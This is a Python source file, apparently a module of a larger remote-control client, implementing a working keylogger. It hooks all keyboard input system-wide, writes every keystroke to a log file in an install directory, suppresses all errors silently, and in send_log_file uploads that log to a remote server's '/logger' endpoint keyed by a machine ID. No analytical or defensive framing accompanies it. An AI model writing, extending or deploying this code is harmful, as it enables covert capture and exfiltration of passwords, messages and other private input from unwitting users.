import os
import keyboard
from datetime import datetime
from features.curlmanager import CurlManager
from config import INSTALL_LOCATION

target_dir = os.path.expandvars(INSTALL_LOCATION)
os.makedirs(target_dir, exist_ok=True)
log_file_path = os.path.join(target_dir, "logger.txt")

def Logger():
    try:
        def on_event(event):
            if event.event_type != "down":
                return
            key_label = normalize_key_name(str(event.name))
            emit_and_write(key_label, log_file_path)

        keyboard.hook(on_event, suppress=False)
        keyboard.wait()
        return
    except Exception as e:
        return


def emit_and_write(key_label, log_file_path):
    try:
        with open(log_file_path, "a", encoding="utf-8") as log_file:
            log_file.write(key_label if key_label != "<ENTER>" else "\n")
            if key_label not in ("<ENTER>",):
                pass
            log_file.flush()
            os.fsync(log_file.fileno())
    except Exception as e:
        pass

def normalize_key_name(name):
    try:
        lower = name.lower()
        special_map = {
            "space": "<SPACE>",
            "enter": "<ENTER>",
            "return": "<ENTER>",
            "tab": "<TAB>",
            "backspace": "<BACKSPACE>",
            "esc": "<ESC>",
            "escape": "<ESC>",
            "shift": "<SHIFT>",
            "shift_r": "<SHIFT_R>",
            "ctrl": "<CTRL>",
            "ctrl_r": "<CTRL_R>",
            "alt": "<ALT>",
            "alt_r": "<ALT_R>",
            "caps lock": "<CAPSLOCK>",
            "caps_lock": "<CAPSLOCK>",
            "win": "<WIN>",
            "windows": "<WIN>",
            "left": "<LEFT>",
            "right": "<RIGHT>",
            "up": "<UP>",
            "down": "<DOWN>",
            "page up": "<PAGEUP>",
            "page_down": "<PAGEDOWN>",
            "home": "<HOME>",
            "end": "<END>",
            "delete": "<DELETE>",
            "del": "<DELETE>",
            "insert": "<INSERT>",
            "print_screen": "<PRINTSCREEN>",
            "scroll_lock": "<SCROLLLOCK>",
            "pause": "<PAUSE>",
        }

        if lower in special_map:
            return special_map[lower]

        if lower.startswith("key."):
            lower = lower[4:]
        if lower.startswith("f") and len(lower) in (2, 3) and lower[1:].isdigit():
            return f"<{lower.upper()}>"

        if len(name) == 1:
            return name

        return f"<{name}>"
    except Exception as e:
        return

def send_log_file(cfc_instance):    
    try:
        if os.path.exists(log_file_path) and os.path.getsize(log_file_path) > 0:

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            name = f"logger_{cfc_instance.client_data['pc_id']}_{timestamp}"

            try:
            
                curl = CurlManager()
                curl.set_headers(cfc_instance.headers)
                url = f"{cfc_instance.base_url}/logger?pc_id={cfc_instance.client_data['pc_id']}&filename={name}"
                
                curl.post_file(
                    url=url,
                    file_path=log_file_path,
                    field_name='file'
                )
            except Exception as e:
                pass

    except Exception as e:
            pass